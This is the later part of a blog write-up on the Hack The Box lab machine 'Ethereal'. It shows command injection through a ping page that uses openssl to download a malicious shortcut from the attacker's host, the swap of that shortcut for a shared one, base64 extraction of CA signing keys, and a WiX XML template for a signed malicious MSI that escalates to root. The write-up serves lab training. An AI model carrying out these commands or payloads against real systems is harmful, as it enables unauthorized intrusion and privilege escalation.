<h4 id="alans-desktop-doesnt-have-the-flag-so-we-need-to-escalate-to-another-user--theres-a-note-on-alans-desktop-in-a-file-called-note-drafttxt">alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called <code class="highlighter-rouge">note-draft.txt</code>:</h4>
<p><img src="/images/hackthebox/ethereal/50.png" alt="" /></p>
<hr />

<h3 id="creating-a-malicious-lnk-and-getting-user">Creating a malicious lnk and getting User</h3>
<p><img src="/images/hackthebox/ethereal/51.png" alt="" /></p>
<h4 id="from-the-note-we-knew-that-theres-a-lnk-on-publics-desktop-and-other-users-on-the-box-are-using-it">From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it.</h4>
<p><img src="/images/hackthebox/ethereal/52.png" alt="" /></p>
<h4 id="so-if-we-replaced-it-with-a-payload-we-can-get-a-shell-as-another-user-theres-a-tool-on-github-called-lnkup-i-used-it-to-create-the-payload-">So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called <a href="https://github.com/Plazmaz/LNKUp">LNKup</a> I used it to create the payload :</h4>
<p><img src="/images/hackthebox/ethereal/53.png" alt="" /></p>
<h4 id="to-uplaod-it-we-will-close-any-one-of-the-servers-and-run-it-again-but-this-time-we-will-redirect-the-lnk-file-to-it-">To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :</h4>
<p><img src="/images/hackthebox/ethereal/54.png" alt="" /></p>
<h4 id="then-on-the-ping-page-we-will-type-this-">Then on the ping page we will type this :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136 &gt; "C:\Users\Public\Desktop\Shortcuts\rick.lnk"</code></p>
<h4 id="we-will-close-the-server--run-the-2-servers-and-get-our-shell-as-alan-like-we-did-before--then-we-will-delete-the-original-lnk-and-copy-ours-with-the-name-of-the-old-lnk-">We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk :</h4>
<p><img src="/images/hackthebox/ethereal/55.png" alt="" />
<br />
<br />
<code class="highlighter-rouge">del "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; copy "c:\users\public\desktop\shortcuts\rick.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; dir c:\users\public\desktop\shortcuts</code>
<img src="/images/hackthebox/ethereal/56.png" alt="" /></p>
<h4 id="then-we-will-close-the-2-servers--run-them-again-and-wait-for-someone-to-execute-the-lnk-file--after-a-minute-we-will-get-a-shell-as-jorge-">Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :</h4>
<p><img src="/images/hackthebox/ethereal/57.png" alt="" /></p>
<h4 id="with-this-we-dont-need-to-refresh-any-pages-because-the-connection-is-not-handled-by-the-ping-page-anymore-so-the-command-will-be-piped-immediately-from-the-first-server-to-the-second-server">With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.</h4>
<p><img src="/images/hackthebox/ethereal/58.png" alt="" /></p>
<h4 id="finally-we-owned-user-">Finally we owned user !</h4>
<p><br /></p>
<hr />

<h3 id="more-filesystem-enumeration">More Filesystem Enumeration</h3>
<h4 id="if-we-checked-the-other-drives-">If we checked the other drives :</h4>
<p><code class="highlighter-rouge">fsutil fsinfo drives</code>
<img src="/images/hackthebox/ethereal/59.png" alt="" /></p>
<h4 id="we-will-find-that-c-is-not-the-only-drive-and-theres-also-d">We will find that <code class="highlighter-rouge">C</code> is not the only drive and there’s also <code class="highlighter-rouge">D</code>.</h4>
<h4 id="unfortunately-if-someone-started-to-enumerate-without-doing-this-important-step-in-windows-enumeration--they-wont-get-anything">Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything.</h4>
<h4 id="contents-of-d">Contents of <code class="highlighter-rouge">D</code>:</h4>
<p><img src="/images/hackthebox/ethereal/60.png" alt="" /></p>
<h4 id="in-dev-theres-a-directory-called-msis-and-it-has-a-note-">In <code class="highlighter-rouge">DEV</code> there’s a directory called <code class="highlighter-rouge">MSIs</code> and it has a note :</h4>
<p><img src="/images/hackthebox/ethereal/61.png" alt="" /></p>
<h4 id="so-we-have-to-create-a-malicious-msi-and-place-it-there-to-get-a-shell-as-rupal-we-also-need-to-get-the-certs-to-sign-the-msi--the-certs-are-found-in-dcerts--mycacer-and-mycapvk--to-transfer-them-to-our-box-we-will-use-openssl-to-base64-encode-the-certs-then-we-can-copy-and-decode-on-our-box">So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in <code class="highlighter-rouge">D:\Certs</code> , <code class="highlighter-rouge">MyCA.cer</code> and <code class="highlighter-rouge">MyCA.pvk</code> , to transfer them to our box we will use <code class="highlighter-rouge">openssl</code> to base64 encode the certs then we can copy and decode on our box.</h4>
<p><code class="highlighter-rouge">C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer</code>
<img src="/images/hackthebox/ethereal/62.png" alt="" />
<code class="highlighter-rouge">C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk</code>
<img src="/images/hackthebox/ethereal/63.png" alt="" /></p>
<h4 id="now-we-will-go-to-a-windows-box-again-to-create-the-msi">Now we will go to a windows box again to create the msi</h4>
<p><br /></p>
<hr />

<h3 id="creating-malicious-msi-and-getting-root">Creating Malicious msi and getting root</h3>
<h4 id="in-order-to-create-the-msi-we-will-use-wixtools--you-can-use-other-msi-builders-but-they-didnt-work-for-me">In order to create the msi we will use <a href="http://wixtoolset.org/">wixtools</a> , you can use other msi builders but they didn’t work for me.</h4>
<h4 id="check-this-page-for-some-wix-msi-usage-examples">Check <a href="https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with">this page</a> for some wix msi usage examples.</h4>
<h4 id="we-will-create-an-msi-that-executes-our-lnk-file-">We will create an msi that executes our lnk file :</h4>
<p><img src="/images/hackthebox/ethereal/64.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">"*"</span> <span class="na">UpgradeCode=</span><span class="s">"12345678-1234-1234-1234-111111111111"</span> <span class="na">Name=</span><span class="s">"Example Product Name"</span>
<span class="na">Version=</span><span class="s">"0.0.1"</span> <span class="na">Manufacturer=</span><span class="s">"@_xpn_"</span> <span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">"200"</span> <span class="na">Compressed=</span><span class="s">"yes"</span> <span class="na">Comments=</span><span class="s">"Windows Installer Package"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">"1"</span> <span class="na">Cabinet=</span><span class="s">"product.cab"</span> <span class="na">EmbedCab=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"TARGETDIR"</span> <span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"ProgramFilesFolder"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"INSTALLLOCATION"</span> <span class="na">Name=</span><span class="s">"Example"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-222222222222"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/Component&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">"DefaultFeature"</span> <span class="na">Level=</span><span class="s">"1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/Feature&gt;</span>
<span class="nt">&lt;Property</span> <span class="na">Id=</span><span class="s">"cmdline"</span><span class="nt">&gt;</span>cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"<span class="nt">&lt;/Property&gt;</span>
<span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">"Stage1"</span> <span class="na">Execute=</span><span class="s">"deferred"</span> <span class="na">Directory=</span><span class="s">"TARGETDIR"</span> <span class="na">ExeCommand=</span><span class="s">'[cmdline]'</span> <span class="na">Return=</span><span class="s">"ignore"</span>
<span class="na">Impersonate=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">"Stage2"</span> <span class="na">Execute=</span><span class="s">"deferred"</span> <span class="na">Script=</span><span class="s">"vbscript"</span> <span class="na">Return=</span><span class="s">"check"</span><span class="nt">&gt;</span>
fail_here
<span class="nt">&lt;/CustomAction&gt;</span>
<span class="nt">&lt;InstallExecuteSequence&gt;</span>
<span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Stage1"</span> <span class="na">After=</span><span class="s">"InstallInitialize"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
<span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Stage2"</span> <span class="na">Before=</span><span class="s">"InstallFiles"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
<span class="nt">&lt;/InstallExecuteSequence&gt;</span>
<span class="nt">&lt;/Product&gt;</span>
<span class="nt">&lt;/Wix&gt;</span> 
</code></pre></div></div>
<h4 id="we-will-use-candleexe-from-wixtools-to-create-a-wixobject-from-msixml">We will use <code class="highlighter-rouge">candle.exe</code> from wixtools to create a wixobject from <code class="highlighter-rouge">msi.xml</code></h4>
<p><img src="/images/hackthebox/ethereal/65.png" alt="" /></p>
<h4 id="then-we-will-use-lightexe-to-create-the-msi-file-from-the-wixobject">Then we will use <code class="highlighter-rouge">light.exe</code> to create the msi file from the wixobject</h4>
<p><img src="/images/hackthebox/ethereal/66.png" alt="" /></p>
<h4 id="after-that-we-need-tools-from-microsoft-sdk-to-sign-our-msi--first-we-will-use-makecertexe-to-create-new-certs-from-the-original-certs-we-got-from-the-box">After that we need tools from microsoft sdk to sign our msi , first we will use <code class="highlighter-rouge">makecert.exe</code> to create new certs from the original certs we got from the box</h4>
<p><code class="highlighter-rouge">makecert.exe -n "CN=Ethereal" -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer</code></p>
<h4 id="it-will-ask-for-a-password-we-will-leave-it-blank-for-no-password-protection-">It will ask for a password we will leave it blank for no password protection :</h4>
<p><img src="/images/hackthebox/ethereal/67.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ethereal/68.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ethereal/69.png" alt="" /></p>
<h4 id="then-we-will-use-pvk2pfxexe-to-create-a-pfx-for-both-the-cer-and-the-pvk-files">Then we will use <code class="highlighter-rouge">pvk2pfx.exe</code> to create a pfx for both the cer and the pvk files.</h4>
<p><code class="highlighter-rouge">pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx</code></p>
<h4 id="and-finally-we-will-use-signtoolexe-to-sign-the-msi-with-the-pfx">And finally we will use <code class="highlighter-rouge">signtool.exe</code> to sign the msi with the pfx</h4>
<p><code class="highlighter-rouge">signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi</code>
<img src="/images/hackthebox/ethereal/70.png" alt="" /></p>
<h4 id="now-back-to-our-kali-we-will-upload-the-msi-the-same-way-we-uploaded-the-lnk-file-before--and-we-also-need-to-make-sure-that-the-lnk-file-is-in-cuserspublicdesktopshortcuts-because-the-msi-is-just-executing-that-lnk-we-will-put-the-msi-into-ddevmsis">Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in <code class="highlighter-rouge">c:\users\public\desktop\shortcuts\</code> because the msi is just executing that lnk. We will put the msi into <code class="highlighter-rouge">D:\DEV\MSIs</code></h4>
<p><img src="/images/hackthebox/ethereal/71.png" alt="" /></p>
<h4 id="then-we-will-close-the-servers--run-them-again-and-wait-for-around-3-5-minutes-until-rupal-opens-the-msi">Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi</h4>
<p><img src="/images/hackthebox/ethereal/72.png" alt="" /></p>
<h4 id="and-we-got-root-">And we got root !</h4>
<p><br />
<br /></p>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-hack-the-box-write-up--hack-the-box---access">Previous Hack The Box write-up : <a href="/hack-the-box/access/">Hack The Box - Access</a></h4>
<h4 id="next-hack-the-box-write-up--hack-the-box---carrier">Next Hack The Box write-up : <a href="/hack-the-box/carrier/">Hack The Box - Carrier</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/ethereal/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

